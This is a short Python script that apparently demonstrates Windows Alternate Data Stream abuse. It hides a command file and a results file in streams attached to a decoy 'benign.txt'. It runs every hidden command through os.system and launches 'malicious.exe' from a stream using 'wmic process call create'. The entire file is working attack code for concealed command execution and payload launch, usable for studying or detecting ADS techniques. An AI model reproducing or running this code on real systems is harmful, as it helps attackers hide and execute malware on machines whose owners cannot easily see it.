import os

def buildADSFIlename(filename,streamname):
    return filename+":"+streamname

decoy="benign.txt"
resultfile=buildADSFIlename(decoy,"results.txt")
commandfile=buildADSFIlename(decoy,"commands.txt")

#Run commands from file 
with open(commandfile,"r") as c:
    for line in c:
        str(os.system(line+" >> "+resultfile))

#Run executable
exefile="malicious.exe"
exepath=os.path.join(os.getcwd(),buildADSFIlename(decoy,exefile))
os.system("wmic process call create "+exepath)